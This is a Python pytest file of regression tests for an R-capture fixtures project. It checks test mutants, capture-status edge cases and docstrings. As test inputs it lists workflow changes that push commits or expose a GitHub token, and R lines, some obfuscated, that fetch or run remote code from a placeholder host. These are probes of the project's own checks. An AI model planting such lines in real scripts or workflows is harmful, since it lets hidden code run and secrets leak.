"""E12 repair 2 (Monday 5 October 2026): regression tests for the findings of the two cold
lenses on ``6928511`` (``handoffs/2026-10-05_E_e12_lens2_fresh-attack.md`` and
``handoffs/2026-10-05_E_e12_lens2_regression.md``). Each test names the finding it pins
and the literal inputs it feeds. Which of these fail at ``6928511`` (measured in a detached
worktree with ``PYTHONPATH=<worktree>/src``) and which pass at both commits is in the
repair note; the tests that pass at both are named ``..._pass_this_check``,
``..._fail_this_check``, ``..._control_...`` or ``..._fails_the_comparisons_it_feeds``.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

import test_day12_r_captures as d12
import test_e12_repair1 as r1
from proofpack import fixtures as fx

pytestmark = pytest.mark.day12

REPO = Path(__file__).resolve().parent.parent

# ------------------------------------------------------------------ FA-B1 / RG-N1

#: Lens 2's two mutants of ``_gate`` in ``tests/test_day12_r_captures.py``: (the text
#: replaced, its replacement). M1 is FA-B1's, the deletion is RG-N1's.
GATE_MUTANTS = {
    "M1 the unreadable branch returns every needed file": (
        "        return caps, []\n",
        "        return caps, list(needs)\n",
    ),
    "RG-N1 the unreadable branch deleted": (
        "    if bad & set(needs):\n        return caps, []\n",
        "",
    ),
}


def _day12_module(source: str) -> dict:
    """``source`` executed as a module whose ``__file__`` is the day-12 test module's, so
    its ``REPO`` and ``COMMITTED`` are the checkout's."""
    path = str(Path(d12.__file__).resolve())
    namespace: dict = {"__name__": "d12_mutant", "__file__": path}
    exec(compile(source, path, "exec"), namespace)  # noqa: S102 - the module's own source
    return namespace


def _outcome(fn, *args) -> str:
    """``passed``, ``failed`` or ``skipped``: what pytest would report for ``fn(*args)``."""
    try:
        fn(*args)
    except pytest.skip.Exception:
        return "skipped"
    except (AssertionError, pytest.fail.Exception):
        return "failed"
    return "passed"


def _day12_source() -> str:
    return Path(d12.__file__).read_text(encoding="utf-8")


@pytest.mark.parametrize("mutant", sorted(GATE_MUTANTS))
def test_fa_b1_each_lens_mutant_of_gate_fails_the_skip_reason_test(tmp_path, monkeypatch, mutant):
    """Lens 2 FA-B1 / RG-N1: with either mutant of ``_gate`` the skip-reason test must read
    ``failed``. At ``6928511`` it read ``skipped`` (the lens: ``1 skipped in 0.43s``)."""
    old, new = GATE_MUTANTS[mutant]
    source = _day12_source()
    assert source.count(old) == 1, mutant
    module = _day12_module(source.replace(old, new))
    skip_test = module["test_the_skip_reasons_are_the_typed_strings"]
    assert _outcome(skip_test, tmp_path, monkeypatch) == "failed"


def test_fa_b1_control_the_unmutated_module_passes_the_skip_reason_test(tmp_path, monkeypatch):
    module = _day12_module(_day12_source())
    skip_test = module["test_the_skip_reasons_are_the_typed_strings"]
    assert _outcome(skip_test, tmp_path, monkeypatch) == "passed"


def test_fa_b1_an_unreadable_capture_fails_the_comparisons_it_feeds(tmp_path):
    """The synthetic capture with ``proc_asah.json`` and ``rms_val_prob_f4.json`` each
    written as ``{"values": `` and ``PROOFPACK_ASAH_VECTORS`` naming the synthetic vectors
    (the r-captures job's shape, E12 repair 3): the day-12 module, run in a subprocess with
    its capture directory redirected there, reads every one of the nine comparisons
    ``FAILED``, none ``SKIPPED``."""
    cap = tmp_path / "r"
    d12.write_synthetic_capture(cap)
    for name in ("proc_asah.json", "rms_val_prob_f4.json"):
        (cap / name).write_text('{"values": ', encoding="utf-8")
    out = r1._run_day12_module(cap, tmp_path / "plugin", vectors=cap / "asah_vectors.csv")
    comparisons = [
        "test_f13_engine_auroc_delong_variance_interval_and_paired_test_equal_proc_on_asah",
        "test_f13b_engine_slope_and_joint_intercept_equal_val_prob_slope_and_intercept",
        "test_f13b_engine_intercept_in_the_large_equals_the_glm_offset_intercept",
        "test_f13b_every_compared_value_equals_the_capture",
        "test_f13b_capture_recorded_the_sha256_of_the_committed_f4_bytes_read_as_lf",
        "test_f13_capture_recorded_the_sha256_of_the_vectors_it_wrote",
        "test_the_fixtures_report_row_f13_is_matched",
        "test_the_fixtures_report_row_f13b_is_matched",
        "test_f13_outside_the_job_the_row_reads_the_recorded_comparison_as_suite_only",
    ]
    assert {n: out.get(n) for n in comparisons} == dict.fromkeys(comparisons, "FAILED")


# ------------------------------------------------------------------ FA-B2 / RG-B1

WORKFLOW_TEST = (
    "test_the_workflow_declares_read_permissions_uses_match_pinned_uses_no_run_matches_git_write"
)
CAPTURE_RUN = "        run: Rscript fixtures/r/capture.R\n"
UPLOAD_USES = "      - uses: actions/upload-artifact@v7\n"

#: Lens 2's workflows that the workflow test does not match (FA-B2 W8-W11, RG-B1 M1-M3).
LENS2_WORKFLOWS_NOT_MATCHED = {
    "W8 git -C . push": (
        CAPTURE_RUN,
        "        run: Rscript fixtures/r/capture.R && git -C . add -A"
        " && git -C . commit -m c && git -C . push\n",
    ),
    "W9 git -c user.name=x commit": (
        CAPTURE_RUN,
        "        run: Rscript fixtures/r/capture.R && git -c user.name=x commit -am c\n",
    ),
    "W10 secrets['GITHUB_TOKEN']": (
        CAPTURE_RUN,
        CAPTURE_RUN + "        env:\n          TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n",
    ),
    "W11 git-auto-commit-action": (
        UPLOAD_USES,
        "      - uses: stefanzweifel/git-auto-commit-action@v5\n" + UPLOAD_USES,
    ),
}
#: Permission mutants the workflow test fails on (RG-B1's M7 and M8).
PERMISSION_MUTANTS = {
    "M7 job-level read-all": ("  capture:\n", "  capture:\n    permissions: read-all\n"),
    "M8 top-level id-token: write": (
        "permissions:\n  contents: read\n",
        "permissions:\n  contents: read\n  id-token: write\n",
    ),
}


def _workflow_outcome(tmp_path: Path, monkeypatch, old: str, new: str) -> str:
    text = r1.WORKFLOW.read_text(encoding="utf-8").replace("\r\n", "\n")
    assert text.count(old) == 1, old
    r1._plant_workflow(tmp_path, text.replace(old, new))
    monkeypatch.setattr(d12, "REPO", tmp_path)
    return _outcome(r1._workflow_test())


@pytest.mark.parametrize("mutant", sorted(LENS2_WORKFLOWS_NOT_MATCHED))
def test_fa_b2_lens_2_workflow_mutants_pass_this_check(tmp_path, monkeypatch, mutant):
    """Each of lens 2's four workflows, planted in a copy of the committed file, passes the
    workflow test: the docstring and ``fixtures/r/README.md`` name them as not matched."""
    old, new = LENS2_WORKFLOWS_NOT_MATCHED[mutant]
    assert _workflow_outcome(tmp_path, monkeypatch, old, new) == "passed"


@pytest.mark.parametrize("mutant", sorted(PERMISSION_MUTANTS))
def test_fa_b2_permission_mutants_fail_this_check(tmp_path, monkeypatch, mutant):
    old, new = PERMISSION_MUTANTS[mutant]
    assert _workflow_outcome(tmp_path, monkeypatch, old, new) == "failed"


def test_fa_b2_the_workflow_test_name_and_the_readme_say_what_it_inspects():
    """At ``6928511`` the name ended ``..._and_no_git_write_step`` and the README said the
    workflow "names no secret, and has no step whose ``run`` calls ``git push``,
    ``git commit`` or ``gh``; that is what ... inspects"."""
    assert r1._workflow_test().__name__ == WORKFLOW_TEST
    assert not [n for n in dir(d12) if "git_write_step" in n]
    readme = (REPO / "fixtures" / "r" / "README.md").read_text(encoding="utf-8")
    assert "names no secret" not in readme
    assert "has no step" not in readme
    assert f"tests/test_day12_r_captures.py::{WORKFLOW_TEST}" in readme
    for planted in ("git -C . push", "secrets['GITHUB_TOKEN']", "git-auto-commit-action@v5"):
        assert planted in readme
        assert planted in (r1._workflow_test().__doc__ or "")


# ------------------------------------------------------------------ FA-B3 / RG-B2

CAPTURE_R_TEST = "test_capture_r_names_the_three_files_and_its_patterns_find_only_listed_names"

#: Lens 2's lines that run a command or fetch a URL and pass the capture.R test (FA-B3,
#: RG-B2 C1-C4), and two more: ``do.call`` and ``eval(parse())`` on a pasted string.
LENS2_CAPTURE_R_LINES = (
    'sh <- system2; sh("curl", "https://example.invalid")',
    'source("https://example.invalid/x.R")',
    'x <- readLines("https://example.invalid/x")',
    'z <- jsonlite::fromJSON("https://example.invalid/x.json")',
    'get("system")("curl https://example.invalid")',
    'do.call("system2", list("curl", "https://example.invalid"))',
    'eval(parse(text = paste0("sys", "tem(\'curl https://example.invalid\')")))',
)


@pytest.mark.parametrize("line", LENS2_CAPTURE_R_LINES)
def test_fa_b3_lens_2_capture_r_lines_pass_this_check(tmp_path, monkeypatch, line):
    """Each line appended alone to a copy of ``capture.R`` passes the capture.R test; its
    docstring names each of the seven as not matched."""
    (tmp_path / "capture.R").write_text(
        r1.CAPTURE_R.read_text(encoding="utf-8") + "\n" + line + "\n", encoding="utf-8"
    )
    monkeypatch.setattr(d12, "COMMITTED", tmp_path)
    assert _outcome(r1._capture_r_test()) == "passed"


def test_fa_b3_the_capture_r_test_name_says_what_it_inspects():
    """At ``6928511`` the name ended ``..._calls_only_listed_packages_and_commands``."""
    fn = r1._capture_r_test()
    assert fn.__name__ == CAPTURE_R_TEST
    assert not [n for n in dir(d12) if "calls_only" in n]
    doc = fn.__doc__ or ""
    for shown in ("sh <- system2", 'source("https://', "do.call", 'paste0("sys"'):
        assert shown in doc


# ------------------------------------------------------------------ FA-B4


def _status(directory: Path) -> dict:
    return fx.r_captures_status(fx.load_r_captures(directory, vectors=None))


def _set_values(path: Path, values: dict) -> None:
    doc = json.loads(path.read_text(encoding="utf-8"))
    doc["values"] = values
    path.write_text(json.dumps(doc), encoding="utf-8")


def test_fa_b4_a_capture_whose_values_are_empty_is_partial(tmp_path):
    """The synthetic capture with ``rms_val_prob_f4.json``'s ``values`` = ``{}``: row F13b
    is ``not_matched`` with 13 values and no numeric deviation; the status is
    ``partial_see_rows_f13_f13b``. At ``6928511`` it was ``present_compared_in_rows_f13_f13b``
    (``n_values_compared`` 13 counted the names tried)."""
    d12.write_synthetic_capture(tmp_path / "r")
    _set_values(tmp_path / "r" / "rms_val_prob_f4.json", {})
    caps = fx.load_r_captures(tmp_path / "r", vectors=None)
    row = fx.compare_row(fx.r_capture_rows(caps)[1], {})
    assert (row["status"], row["n_values_compared"]) == ("not_matched", len(fx.F13B_NAMES))
    assert [v["abs_deviation"] for v in row["values"]] == [None] * len(fx.F13B_NAMES)
    st = _status(tmp_path / "r")
    assert st["status"] == fx.R_CAPTURES_PARTIAL
    assert st["line"].endswith(
        "absent: none; row F13 suite_only, row F13b not_matched; the aSAH vectors are read "
        "inside the r-captures job only (DEC-77)"
    )


def test_fa_b4_proc_values_all_nan_strings_is_partial(tmp_path):
    """``proc_asah.json``'s every value written as ``"NaN"`` (what ``capture.R`` writes for
    a value that is not finite): F13 compares no value, the status is partial."""
    d12.write_synthetic_capture(tmp_path / "r")
    path = tmp_path / "r" / "proc_asah.json"
    names = json.loads(path.read_text(encoding="utf-8"))["values"]
    _set_values(path, dict.fromkeys(names, "NaN"))
    st = _status(tmp_path / "r")
    assert st["rows"] == {"F13": "not_matched", "F13b": "matched"}
    assert st["status"] == fx.R_CAPTURES_PARTIAL


def test_fa_b4_control_one_value_read_in_each_row_is_present(tmp_path):
    """``rms_val_prob_f4.json``'s ``values`` cut to ``val.prob Slope`` alone: row F13b is
    ``not_matched`` (12 values missing) and holds one numeric deviation, so the status is
    ``present_compared_in_rows_f13_f13b``; the line names the row ``not_matched``."""
    d12.write_synthetic_capture(tmp_path / "r")
    path = tmp_path / "r" / "rms_val_prob_f4.json"
    slope = json.loads(path.read_text(encoding="utf-8"))["values"]["val.prob Slope"]
    _set_values(path, {"val.prob Slope": slope})
    st = _status(tmp_path / "r")
    assert st["status"] == fx.R_CAPTURES_PRESENT
    assert st["line"].endswith(
        "row F13 suite_only, row F13b not_matched; the aSAH vectors are read inside the "
        "r-captures job only (DEC-77)"
    )


def test_fa_b4_the_status_docstring_names_the_deviation_rule():
    """At ``6928511`` the docstring said "when both compared one or more values"."""
    doc = fx.r_captures_status.__doc__ or ""
    assert "both compared one or more" not in doc
    assert "values with a numeric ``abs_deviation``" in " ".join(doc.split())


# ------------------------------------------------------------------ FA-B5


def test_fa_b5_the_repair1_docstring_names_the_two_controls():
    """At ``6928511`` the docstring said every test in ``tests/test_e12_repair1.py``
    failed at ``2328e86``; the two controls passed there."""
    doc = " ".join((r1.__doc__ or "").split())
    assert "and failed there" not in doc
    assert "18 failed and 2 passed there" in doc
    for control in (
        "test_fa_b3_control_the_committed_workflow_copied_passes",
        "test_rg_b2_control_the_committed_capture_r_copied_passes",
    ):
        assert control in doc and callable(getattr(r1, control))
